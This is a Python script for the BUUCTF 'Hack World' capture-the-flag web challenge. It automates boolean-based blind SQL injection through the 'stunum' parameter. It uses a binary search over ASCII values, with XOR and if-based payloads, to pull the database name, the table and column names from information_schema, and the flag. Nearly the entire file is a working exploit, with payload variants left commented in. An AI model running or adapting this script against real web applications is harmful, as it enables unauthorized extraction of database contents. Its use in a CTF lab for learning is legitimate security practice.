#buuctf web Hack World
import requests
import time
 
 
url = "http://a82e6674-c5de-4ab2-bacd-cc50014236c1.node5.buuoj.cn:81/"

# 数据库信息
database = ''
table = ''
column = ''


flag = ""
i = 0
  
while True:
    i = i + 1
    letf = 32
    right = 127
    while letf < right:
        mid = (letf+right) // 2

        ## payload
        # payload = f"if(ascii(substr((select(flag)from(flag)),{i},1))>{mid},1,2)"  # 第一种解法(if判断)
        # payload = f"0^(ascii(substr((select(flag)from(flag)),{i},1))>{mid})"  # 第二种解法(异或)

        # payload = f"0^(ascii(substr((database()),{i},1))>{mid})" # 爆库
        # 爆表
        payload = f"0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1))>{mid})"
        # 爆列
        # payload = f"0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='{table}')),{i},1))>{mid})"
        # 爆值
        # payload = f"0^(ascii(substr((select(group_concat({column}))from({table})),{i},1))>{mid})"
        
        data = {"stunum":payload} 
        res = requests.get(url=url, params=data).text
        time.sleep(0.005)
        if "admin" in res:
            letf = mid + 1
        else:
            right = mid
    if letf != 32:
        flag += chr(letf)
    else:
        break
print(flag)

